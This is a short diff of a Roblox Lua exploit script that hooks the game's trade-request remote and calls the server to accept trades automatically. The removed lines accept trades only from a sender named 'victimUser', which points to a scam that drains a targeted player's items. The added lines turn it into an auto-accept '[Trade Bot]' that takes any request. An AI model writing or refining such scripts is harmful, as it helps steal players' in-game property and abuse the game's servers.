@@ -67,10 +67,14 @@ local inventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).
 local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")
 
 TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender, ...)
-    if sender.Name == victimUser then
-        TradeAcceptOrDeclineRequest:InvokeServer(sender, true)
+    print("[Trade Bot] Trade request received from:", sender)
+    
+    if sender then
+        print("[Trade Bot] Accepting trade automatically...")
+        local result = TradeAcceptOrDeclineRequest:InvokeServer(sender, true)
+        print("[Trade Bot] Server response:", result)
     else
-        TradeAcceptOrDeclineRequest:InvokeServer(sender, false)
+        print("[Trade Bot] Warning: 'sender' argument was nil.")
     end
 end)
 
